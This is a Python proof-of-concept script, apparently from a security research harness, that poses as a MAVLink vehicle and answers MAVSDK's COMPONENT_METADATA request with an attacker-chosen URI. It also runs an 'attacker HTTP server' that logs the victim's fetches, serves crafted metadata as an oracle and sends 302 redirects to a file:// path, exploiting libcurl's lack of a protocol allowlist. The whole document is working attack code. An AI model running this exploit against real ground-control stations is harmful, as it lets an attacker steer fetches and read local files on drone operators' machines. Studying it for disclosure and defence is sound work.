"""MAVSDK-01 probe: COMPONENT_METADATA.uri -> libcurl, with no protocol allowlist.

Answers MAVSDK's own request for COMPONENT_METADATA (msg 397) with a uri the
operator never chose, and runs an HTTP server so the attacker can see which
fetches actually arrive. --serve-general makes that server hand back a general
metadata document whose metadataTypes[0] carries a primary uri and a fallback
uri, which is the oracle: MAVSDK only fetches the fallback when the primary
download failed (mavlink_component_metadata.cpp:544-548).
"""
import argparse, http.server, json, os, socketserver, sys, threading, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import mavlink_harness as poc
from pymavlink import mavutil

HITS = []


class Handler(http.server.BaseHTTPRequestHandler):
    general = None

    def log_message(self, *a):
        pass

    def do_GET(self):
        HITS.append(self.path)
        poc.observe("HTTP hit from the victim: %s" % self.path)
        if self.general is not None and self.path == "/general.json":
            body = json.dumps(self.general).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if self.path.startswith("/redirect-to-file"):
            target = os.environ.get("REDIR_TARGET", "file:///etc/mavsdk-bench-secret.txt")
            poc.attack("answering 302 -> %s" % target)
            self.send_response(302)
            self.send_header("Location", target)
            self.end_headers()
            return
        body = b'{"version": 1, "metadataTypes": []}'
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class Vehicle(poc.FakeVehicle):
    def __init__(self, *a, **kw):
        self.meta_uri = kw.pop("meta_uri")
        super().__init__(*a, **kw)

    def _extra_rx_hook(self, msg, t):
        if t not in ("COMMAND_LONG", "COMMAND_INT"):
            return False
        if getattr(msg, "command", None) == 512 and int(getattr(msg, "param1", 0) or 0) == 397:
            poc.observe("MAVSDK requested COMPONENT_METADATA (397) by itself")
            self.master.mav.command_ack_send(512, mavutil.mavlink.MAV_RESULT_ACCEPTED)
            self.send_component_metadata(self.meta_uri)
            poc.attack("answered COMPONENT_METADATA uri=%r" % self.meta_uri)
            return True
        return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", default="0.0.0.0:5760")
    ap.add_argument("--uri", required=True, help="COMPONENT_METADATA.uri to hand the victim")
    ap.add_argument("--http-port", type=int, default=8080)
    ap.add_argument("--serve-general", default=None, metavar="JSON",
                    help="serve this general-metadata document at /general.json")
    ap.add_argument("--seconds", type=int, default=40)
    a = ap.parse_args()

    if a.serve_general:
        Handler.general = json.loads(a.serve_general)
    socketserver.TCPServer.allow_reuse_address = True
    srv = socketserver.TCPServer(("0.0.0.0", a.http_port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    poc.observe("attacker HTTP server on :%d" % a.http_port)

    v = Vehicle("tcpin:" + a.listen, verbose=False, meta_uri=a.uri)
    poc.observe("COMPONENT_METADATA.uri = %r" % a.uri)
    v.start()
    poc.observe("waiting for the GCS")
    time.sleep(a.seconds)
    print("HITS=" + json.dumps(HITS))


if __name__ == "__main__":
    sys.exit(main())
